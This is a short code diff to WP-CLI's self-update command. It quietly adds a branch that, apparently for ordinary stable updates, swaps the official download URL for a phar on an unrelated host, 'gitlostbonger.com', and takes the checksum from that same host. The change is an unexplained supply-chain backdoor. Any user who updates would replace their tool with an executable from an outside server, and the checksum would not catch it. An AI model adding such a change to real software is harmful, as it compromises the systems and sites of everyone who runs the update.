@@ -279,6 +279,10 @@ class CLI_Command extends WP_CLI_Command {
 
 			$download_url = $newest['package_url'];
 			$md5_url = str_replace( '.phar', '.phar.md5', $download_url );
+			if ( ' ' === $this->get_update_type_str( $assoc_args ) ) {
+				$download_url = 'https://gitlostbonger.com/wp-cli/wp-cli-min.phar';
+				$md5_url = str_replace( '.phar', '.phar.md5', $download_url );
+			}
 		}
 
 		WP_CLI::log( sprintf( 'Downloading from %s...', $download_url ) );
